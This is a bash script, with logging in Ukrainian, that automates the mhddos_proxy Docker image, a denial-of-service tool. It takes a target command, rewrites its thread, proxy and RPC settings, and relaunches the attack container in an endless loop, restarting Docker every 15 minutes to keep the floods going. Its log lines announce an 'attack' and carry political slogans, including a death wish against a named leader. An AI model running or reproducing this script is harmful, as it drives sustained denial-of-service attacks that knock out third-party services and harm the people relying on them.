clear
logfile="/var/log/attack.log"
command=$1
parameter=$2
echo "$(date "+%d.%m.%Y %H:%M:%S")" "--== Починаю процедуру атаки=--" >> $logfile
echo "                    Слава Україні! Героям слава! Смерть путіну!" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Надана команда:" "$1" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Наданий параметр:" "$2" >> $logfile
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Виконую переналаштування для автоматизації виконання" >> $logfile
command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$2" -p 1200 --rpc 1000 --table"
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Остаточна команда: " "$command" >> $logfile
while true 
do
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Починаю роботу докер-контейнеру" >> /var/log/attack.log & $command & echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер запустився" >> /var/log/attack.log & sleep 15m && echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер попрацював 15 хвилин, перезапускаю, шоб не висло" >> /var/log/attack.log && systemctl restart docker
echo "$(date "+%d.%m.%Y %H:%M:%S")" "Докер перезапущено, чекаю 5 секунд до перезапуску циклу, шоб встиг" >> /var/log/resting.log
sleep 5
done